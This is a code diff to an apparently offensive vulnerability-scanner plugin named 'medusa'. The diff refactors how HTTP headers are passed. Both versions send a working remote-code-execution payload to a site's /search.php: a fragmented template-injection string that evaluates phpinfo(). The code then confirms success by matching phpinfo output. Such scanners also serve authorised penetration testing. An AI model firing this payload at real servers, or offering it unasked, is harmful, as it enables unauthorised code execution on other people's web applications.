@@ -31,7 +31,7 @@ def UrlProcessing(url):
         res = urllib.parse.urlparse('http://%s' % url)
     return res.scheme, res.hostname, res.port
 
-def medusa(Url,RandomAgent,proxies=None,**kwargs):
+def medusa(Url:str,Headers:dict,proxies:str=None,**kwargs)->None:
     proxies=ClassCongregation.Proxies().result(proxies)
 
     scheme, url, port = UrlProcessing(Url)
@@ -45,17 +45,11 @@ def medusa(Url,RandomAgent,proxies=None,**kwargs):
         payload = "/search.php?phpinfo()"
         payload_url = scheme + "://" + url +":"+ str(port) + payload
         payload_data="searchtype=5&searchword={if{searchpage:year}&year=:as{searchpage:area}}&area=s{searchpage:letter}&letter=ert{searchpage:lang}&yuyan=($_SE{searchpage:jq}&jq=RVER{searchpage:ver}&&ver=[QUERY_STRING]));/*"
-        headers = {
-            'Accept-Encoding': 'gzip, deflate',
-            'Accept': '*/*',
-            'Accept-Language': 'en',
-            'User-Agent': RandomAgent,
-            'Content-Type': 'application/x-www-form-urlencoded',
-            'Origin': scheme+'://'+url,
-            'Referer':payload
-        }
-
-        resp = requests.post(payload_url, headers=headers, data=payload_data,proxies=proxies,timeout=5, verify=False)
+        Headers['Accept'] = '*/*'
+        Headers['Content-Type'] = 'application/x-www-form-urlencoded'
+        Headers['Origin'] = scheme + '://' + url
+        Headers['Referer'] = payload
+        resp = requests.post(payload_url, headers=Headers, data=payload_data,proxies=proxies,timeout=5, verify=False)
         con=resp.text
         code = resp.status_code
         if code== 200 and con.find('System') != -1 and con.find('Compiler') != -1 and con.find('Build Date') != -1 and con.find('IPv6 Support') != -1 and con.find('Configure Command') != -1:
